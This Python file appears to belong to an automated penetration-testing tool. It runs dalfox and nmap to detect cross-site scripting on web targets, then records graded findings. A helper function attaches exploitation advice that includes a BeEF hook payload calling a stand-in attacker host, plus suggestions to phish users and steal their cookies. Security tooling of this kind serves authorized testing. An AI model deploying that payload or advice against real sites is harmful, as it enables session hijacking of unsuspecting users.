"""
xss_subagent.py — Cross-Site Scripting (XSS) detection via dalfox.

Methodology:
  1. dalfox url on each web_target — reflected, stored, DOM XSS detection
  2. Parse dalfox output for XSS type, parameter, payload
  3. Severity:
       HIGH   — stored XSS (persists for all users)
       MEDIUM — reflected XSS (requires user interaction)
       LOW    — DOM-only XSS (client-side, limited impact)
  4. Emit "xss_complete" event with summary
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# dalfox output parsers
# ---------------------------------------------------------------------------
# dalfox output:
#   [POC][V][REFLECTED] URL — parameter=payload
#   [POC][G][DOM] ...
#   [POC][S][STORED] ...
_DALFOX_VULN_RE = re.compile(
    r"\[POC\]\[([VGS])\]\[([A-Z]+)\]\s*(.+)",
    re.IGNORECASE,
)
_DALFOX_PARAM_RE  = re.compile(r"(\w+)=", re.IGNORECASE)
_DALFOX_PAYLOAD_RE = re.compile(r'(?:payload|value)[:=]\s*"?([^"\n]+)"?', re.IGNORECASE)

# xsstrike output (run via custom MCP tool wrapping xsstrike)
_XSSTRIKE_RE = re.compile(
    r"(?:Payload|XSS found|Vulnerable).*?(?:at|in|on)\s+(\S+)",
    re.IGNORECASE,
)

_XSS_TYPE_SEVERITY = {
    "stored":    "HIGH",
    "reflected": "MEDIUM",
    "dom":       "LOW",
    "blind":     "HIGH",
}


# ---------------------------------------------------------------------------
# Subagent
# ---------------------------------------------------------------------------

class XssSubagent(BaseSubagent):
    """
    XSS detection using dalfox across all provided web targets.
    """

    AGENT_NAME    = "web"
    SUBAGENT_NAME = "xss"

    async def run(  # noqa: C901
        self,
        target: str,
        web_targets: list[dict] | None = None,
        endpoints:   list[str]   | None = None,
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Scan for XSS vulnerabilities.

        Parameters
        ----------
        target:
            Base host/IP.
        web_targets:
            List of URL dicts from web_fingerprint.
        endpoints:
            Additional endpoint URLs from crawl_subagent.

        Returns
        -------
        SubagentResult
            parsed_data["xss_findings"] — list of XSS result dicts
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )
        result.parsed_data: dict = {"xss_findings": []}
        wall_start = time.monotonic()

        scan_urls: list[str] = []
        if web_targets:
            scan_urls = [wt["url"] for wt in web_targets if isinstance(wt, dict) and "url" in wt]
        if endpoints:
            for ep in endpoints:
                if ep not in scan_urls:
                    scan_urls.append(ep)
        if not scan_urls:
            scan_urls = [f"http://{target}"]

        xss_findings: list[dict] = []

        for url in scan_urls[:20]:  # cap scan targets for performance
            # ── dalfox ───────────────────────────────────────────────────
            logger.info("[xss] dalfox on %s", url)
            try:
                df_out = await self.collect_tool(
                    "dalfox",
                    target,
                    {
                        "options": (
                            f"url \"{url}\" "
                            f"--silence --no-color "
                            f"--timeout 10 --delay 0 "
                            f"--worker 10 "
                            f"--skip-bav"
                        )
                    },
                )
                self._tool_outputs[f"dalfox_{url}"] = df_out
                parsed = _parse_dalfox_output(df_out, url)

                for xf in parsed:
                    xss_findings.append(xf)
                    severity = _XSS_TYPE_SEVERITY.get(xf.get("xss_type", "").lower(), "MEDIUM")
                    await self.store_finding(Finding(
                        title=(
                            f"{xf['xss_type'].title()} XSS: "
                            f"param={xf.get('parameter', 'unknown')} @ {url}"
                        ),
                        description=_xss_description(xf, url),
                        severity=severity,
                        evidence=xf.get("raw", "")[:600],
                        tool="dalfox",
                        host=target,
                        port=_port_from_url(url),
                        mitre_technique="T1059.007",
                        exploit_suggestion=_xss_exploit_hint(xf),
                    ))

            except Exception as exc:
                logger.warning("[xss] dalfox error for %s: %s", url, exc)

            # ── nmap http-xssed script (lightweight supplemental check) ──
            port = _port_from_url(url)
            if port:
                try:
                    nmap_out = await self.collect_tool(
                        "nmap",
                        target,
                        {
                            "options": (
                                f"--script=http-xssed "
                                f"-p {port} {target}"
                            )
                        },
                    )
                    self._tool_outputs[f"nmap_xss_{port}"] = nmap_out

                    if re.search(r"XSS vulnerabilities|xssed", nmap_out, re.IGNORECASE):
                        xss_findings.append({
                            "url":       url,
                            "xss_type":  "reflected",
                            "parameter": "unknown",
                            "payload":   "",
                            "raw":       nmap_out[:400],
                            "source":    "nmap",
                        })
                        await self.store_finding(Finding(
                            title=f"XSS (nmap http-xssed): {url}",
                            description=(
                                f"nmap http-xssed script flagged potential XSS on {url}. "
                                f"Manual verification required."
                            ),
                            severity="MEDIUM",
                            evidence=nmap_out[:500],
                            tool="nmap",
                            host=target,
                            port=port,
                            mitre_technique="T1059.007",
                            exploit_suggestion="Verify manually with browser and craft targeted XSS payload.",
                        ))

                except Exception as exc:
                    logger.debug("[xss] nmap xss script error: %s", exc)

        result.parsed_data["xss_findings"] = xss_findings
        result.findings                     = self._findings
        result.tool_outputs                 = self._tool_outputs
        result.duration_seconds             = time.monotonic() - wall_start

        await self._emit(
            "xss_complete",
            {
                "target":           target,
                "xss_count":        len(xss_findings),
                "finding_count":    len(self._findings),
                "duration_seconds": round(result.duration_seconds, 2),
            },
        )

        logger.info(
            "[xss] complete — %d XSS findings, %d stored, %.1fs",
            len(xss_findings), len(self._findings), result.duration_seconds,
        )
        return result


# ---------------------------------------------------------------------------
# Parsers / helpers
# ---------------------------------------------------------------------------

def _parse_dalfox_output(output: str, url: str) -> list[dict]:
    """Parse dalfox output into XSS finding dicts."""
    findings: list[dict] = []
    for line in output.splitlines():
        m = _DALFOX_VULN_RE.search(line)
        if not m:
            continue

        confidence = m.group(1)  # V=verified, G=grep/potential, S=stored
        xss_type   = m.group(2).lower()
        detail     = m.group(3).strip()

        if confidence == "G":
            # Grep-only / unverified — lower confidence, skip INFO
            xss_type = "dom" if "dom" in xss_type else xss_type

        param_m   = _DALFOX_PARAM_RE.search(detail)
        payload_m = _DALFOX_PAYLOAD_RE.search(detail)

        findings.append({
            "url":        url,
            "xss_type":   xss_type,
            "confidence": confidence,
            "parameter":  param_m.group(1) if param_m else "",
            "payload":    payload_m.group(1)[:200] if payload_m else "",
            "raw":        line,
            "source":     "dalfox",
        })
    return findings


def _xss_description(xf: dict, url: str) -> str:
    xtype = xf.get("xss_type", "unknown").title()
    param = xf.get("parameter", "unknown")
    return (
        f"{xtype} XSS vulnerability found in parameter '{param}' at {url}. "
        f"Confidence: {xf.get('confidence', '?')}. "
        + (f"Payload: {xf.get('payload', '')[:100]}. " if xf.get("payload") else "")
    )


def _xss_exploit_hint(xf: dict) -> str:
    xtype = xf.get("xss_type", "").lower()
    param = xf.get("parameter", "param")
    if xtype == "stored":
        return (
            f"Stored XSS in '{param}' — inject BeEF hook script to capture sessions "
            f"from all users who view the page. "
            f"Payload: <script src=http://ATTACKER/hook.js></script>"
        )
    if xtype == "reflected":
        return (
            f"Reflected XSS in '{param}' — craft phishing URL with payload and deliver "
            f"to target user to steal cookies or perform actions on their behalf."
        )
    return (
        f"DOM XSS — requires user interaction with malicious URL fragment/input. "
        f"Chain with CORS misconfiguration for greater impact."
    )


def _port_from_url(url: str) -> int | None:
    m = re.search(r":(\d+)(?:/|$)", url)
    if m:
        return int(m.group(1))
    if url.startswith("https://"):
        return 443
    if url.startswith("http://"):
        return 80
    return None
